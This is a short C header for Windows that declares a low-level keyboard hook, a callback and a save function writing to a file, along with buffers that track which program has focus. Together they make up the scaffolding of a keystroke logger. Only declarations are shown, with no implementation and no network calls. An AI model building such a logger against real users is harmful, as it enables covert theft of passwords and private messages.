#pragma once

#include <stdio.h>
#include <Windows.h>

#define PROG_NAME_LENGTH 256
#define SPECIALS_LENGTH 22

extern const int SPECIALS_CODES[SPECIALS_LENGTH];
extern const char* SPECIALS[SPECIALS_LENGTH];

extern HHOOK hook;
extern KBDLLHOOKSTRUCT kb_struct;
extern FILE* file;
extern char prev_prog_name[PROG_NAME_LENGTH];
extern char curr_prog_name[PROG_NAME_LENGTH];

int find_key(int key);

int save(int key);

LRESULT __stdcall hook_callback(int n_code, WPARAM w_param, LPARAM l_param);